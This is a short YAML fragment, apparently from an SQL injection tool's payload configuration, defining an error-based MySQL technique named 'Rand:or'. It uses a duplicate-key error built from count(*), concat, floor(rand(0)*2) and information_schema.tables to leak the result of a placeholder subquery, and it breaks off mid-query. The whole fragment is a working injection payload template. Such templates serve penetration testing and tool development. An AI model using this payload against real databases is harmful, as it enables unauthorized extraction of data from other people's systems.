   - name: Rand:or
     query: |
      /* Duplicate entry '<sqli>' for key 'group_key' */
      or exists(
          select
              count(*),
              concat(
                  (
                      ${window}
                  ),
                  floor(rand(0)*2)
              )
          from information_schema.tables
